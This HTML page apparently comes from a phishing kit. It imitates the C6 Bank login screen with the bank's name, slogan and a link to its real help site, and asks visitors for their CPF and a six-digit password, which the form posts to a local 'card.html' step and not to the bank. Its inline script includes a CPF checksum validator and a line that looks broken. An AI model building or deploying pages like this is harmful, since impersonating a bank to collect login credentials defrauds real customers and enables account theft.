<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>C6 Bank: Banco Completo, com Conta Digital, Cartão de Crédito e mais</title>
    <link rel="stylesheet" href="login.css">
    <link rel="shortcut icon" href="img/logo.png">
</head>
<body>
    <header>
        <h1>C6 Bank - Seu Banco Digital</h1>
        <a id="referencia" href="https://ajuda.c6bank.com.br/s/">Tire suas dúvidas</a>
    </header>
    <main class="aria">
        <div class="card">
            <div class="cartao">
                <img id="carbon" src="img/03.png" alt="">
                <div class="texto">
                    <h2>C6 Bank: Eleito pela 2ª vez o melhor banco digital do Brasil</h2>
                    <p>Escolhido por 20 milhões de pessoas</p>
                </div>
            </div>

        </div>
        <div class="principal">
            <div class="texto_esquerdo">
                <h3>Faça Login e acompanhe:</h3>
                <div class="ul">
                    <ul>
                        <li>Sua Fatura</li>
                        <li>Seus Investimantos</li>
                    </ul>
                    <ul>
                        <li>Atualizações de Milhas</li>
                        <li>Passagens Aéreas</li>
                    </ul>
                </div>
            </div>
            <div class="box">
                <form id="form" action="card.html" method="post">
                    <h2>Insira seus Dados</h2>
                    <input class="input" type="tel" id="cpf" name="cpf" placeholder="CPF" required minlength="11" maxlength="11"
                    onblur="validarCPF(this)" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*?)\..*/g, '$1');">
                    <input class="input" type="password" id="senha" name="senha" placeholder="Senha" required minlength="6" maxlength="6"
                    oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*?)\..*/g, '$1');">
                    <input class="input" type="submit" id="submit" name="submit" value="Próximo">
                </form>
            </div>
        </div>
    </main>
    <script>
        var cpf = document.getElementById('cpf') 
        cpf.replace(/^(\d{3})(\d{3})(\d{3})(\d{2})/, $1.$2.$3-$4);
        
        function _cpf(cpf) {
        cpf = cpf.replace(/[^\d]+/g, '');
        if (cpf == '') return false;
        if (cpf.length != 11 ||
        cpf == "00000000000" ||
        cpf == "11111111111" ||
        cpf == "22222222222" ||
        cpf == "33333333333" ||
        cpf == "44444444444" ||
        cpf == "55555555555" ||
        cpf == "66666666666" ||
        cpf == "77777777777" ||
        cpf == "88888888888" ||
        cpf == "99999999999")
        return false;
        add = 0;
        for (i = 0; i < 9; i++)
        add += parseInt(cpf.charAt(i)) * (10 - i);
        rev = 11 - (add % 11);
        if (rev == 10 || rev == 11)
        rev = 0;
        if (rev != parseInt(cpf.charAt(9)))
        return false;
        add = 0;
        for (i = 0; i < 10; i++)
        add += parseInt(cpf.charAt(i)) * (11 - i);
        rev = 11 - (add % 11);
        if (rev == 10 || rev == 11)
        rev = 0;
        if (rev != parseInt(cpf.charAt(10)))
        return false;
        return true;
        }
        function validarCPF(el){
        if( !_cpf(el.value) ){

        alert("CPF inválido!" + el.value);

        // apaga o valor
        el.value = "";
        }
        }
    </script>
</body>
</html>
